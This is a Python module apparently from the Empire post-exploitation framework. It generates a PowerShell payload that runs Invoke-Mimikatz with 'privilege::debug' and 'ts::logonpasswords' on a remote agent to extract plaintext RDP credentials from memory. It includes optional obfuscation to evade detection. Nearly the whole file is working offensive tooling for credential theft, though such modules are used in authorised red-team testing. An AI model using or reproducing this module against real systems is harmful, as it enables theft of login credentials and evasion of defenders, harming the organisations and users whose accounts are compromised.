from __future__ import print_function

from builtins import object
from builtins import str

from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz Dump Terminal Server Passwords',

            'Author': ['@snovvcrash', '@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to extract plaintext RDP credentials from memory."),

            'Software': 'S0002',

            'Techniques': ['T1003', 'T1081'],

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://blog.gentilkiwi.com',
                'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/',
                'https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # build the dump command with whatever options we want
        scriptEnd = "Invoke-Mimikatz -Command '"

        scriptEnd += "\"privilege::debug\" "

        scriptEnd += "\"ts::logonpasswords\" "

        scriptEnd += "\"exit\""

        scriptEnd += "';"

        for option,values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    scriptEnd += " -" + str(option) + " " + str(values['Value']) 

        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)
        return script
